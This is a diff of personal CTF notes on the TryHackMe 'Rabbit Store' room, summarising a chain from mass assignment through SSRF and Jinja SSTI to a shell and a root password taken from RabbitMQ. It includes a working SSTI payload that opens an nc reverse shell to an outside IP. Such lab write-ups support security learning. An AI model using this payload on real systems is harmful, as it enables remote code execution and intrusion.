@@ -1,9 +1,13 @@
 
 2025-04-03 14:44
 
-Source: 
+Source: #Boot2root 
+# TL;DR
 
-Tags: 
+**Rabbit Store** started with exploiting a **mass assignment vulnerability** to register an activated account, granting access to an API endpoint vulnerable to **SSRF**. Leveraging this **SSRF** vulnerability, we accessed the **API** documentation and discovered another endpoint vulnerable to **SSTI**, which we exploited to achieve **RCE** and gain a shell.
+
+After obtaining a shell, we retrieved the **Erlang cookie**, which allowed us to enumerate the **RabbitMQ** instance and discover the password for the **root** user
+
 
 
 Jinja [[SSTI]] 
@@ -11,6 +15,11 @@ Jinja [[SSTI]]
 {"username":"{{ self.__init__.__globals__.__builtins__.__import__('os').popen('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.17.62.140 1234 >/tmp/f').read() }}"}
 
 ```
+
+
+
+
+
 ### References
 [TryHackMe | Rabbit Store](https://tryhackme.com/room/rabbitstore)
 
